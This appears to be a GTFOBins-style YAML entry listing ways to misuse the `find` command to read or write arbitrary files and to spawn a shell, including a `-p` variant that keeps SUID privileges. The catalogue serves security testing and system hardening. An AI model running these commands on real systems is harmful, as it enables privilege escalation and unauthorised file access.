---
functions:
  file-read:
  - code: |-
      find /path/to/input-file -exec cat {} \;
    comment: |-
      This uses `cat` to actually read the file, but since permissions are not dropped, it's executed with the same privileges as `find`.
    contexts:
      sudo:
      suid:
      unprivileged:
  file-write:
  - code: |-
      find / -fprintf /path/to/output-file DATA -quit
    comment: |-
      `DATA` is a format string, it supports some escape sequences.
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      find . -exec /bin/sh \; -quit
    contexts:
      sudo:
      suid:
        code: |-
          find . -exec /bin/sh -p \; -quit
        shell: false
      unprivileged:
...
